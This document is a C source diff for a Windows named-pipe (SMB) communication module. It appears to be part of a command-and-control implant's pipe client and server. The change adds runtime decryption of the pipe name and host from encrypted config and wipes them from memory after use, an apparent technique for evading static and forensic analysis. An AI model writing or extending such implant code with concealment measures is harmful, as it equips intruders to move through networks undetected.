@@ -23,13 +23,20 @@ BOOL smb_init(void) {
     if (CONFIG_PIPE_ENABLED != 2) return FALSE; /* 2 = client mode */
 
     /* Build pipe path: \\<host>\pipe\<name> or \\.\pipe\<name> */
+    char pipe_name_dec[256];
+    DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
+    char pipe_host_dec[256];
+    DECRYPT_CONFIG(pipe_host_dec, PIPE_HOST);
+
     char pipe_path[512];
-    if (CONFIG_PIPE_HOST[0] != '\0') {
+    if (pipe_host_dec[0] != '\0') {
         snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s",
-                 CONFIG_PIPE_HOST, CONFIG_PIPE_NAME + 9); /* Skip \\.\pipe\ prefix */
+                 pipe_host_dec, pipe_name_dec + 9); /* Skip \\.\pipe\ prefix */
     } else {
-        strncpy(pipe_path, CONFIG_PIPE_NAME, sizeof(pipe_path) - 1);
+        strncpy(pipe_path, pipe_name_dec, sizeof(pipe_path) - 1);
     }
+    SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
+    SecureZeroMemory(pipe_host_dec, sizeof(pipe_host_dec));
 
     wchar_t wPipePath[512];
     MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);
@@ -168,8 +175,11 @@ static volatile BOOL g_server_running = FALSE;
 
 static DWORD WINAPI pipe_server_thread(LPVOID param) {
     (void)param;
+    char pipe_name_dec[256];
+    DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
     wchar_t wPipeName[256];
-    MultiByteToWideChar(CP_UTF8, 0, CONFIG_PIPE_NAME, -1, wPipeName, 256);
+    MultiByteToWideChar(CP_UTF8, 0, pipe_name_dec, -1, wPipeName, 256);
+    SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
 
     while (g_server_running) {
         /* Create named pipe instance */
@@ -274,8 +284,11 @@ void smb_stop_pipe_server(void) {
 
     /* Wake up the blocking ConnectNamedPipe by connecting to it */
     if (g_pipe_server != INVALID_HANDLE_VALUE) {
+        char pipe_name_dec[256];
+        DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
         wchar_t wPipeName[256];
-        MultiByteToWideChar(CP_UTF8, 0, CONFIG_PIPE_NAME, -1, wPipeName, 256);
+        MultiByteToWideChar(CP_UTF8, 0, pipe_name_dec, -1, wPipeName, 256);
+        SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
         HANDLE hDummy = CreateFileW(wPipeName, GENERIC_READ, 0, NULL,
                                      OPEN_EXISTING, 0, NULL);
         if (hDummy != INVALID_HANDLE_VALUE)
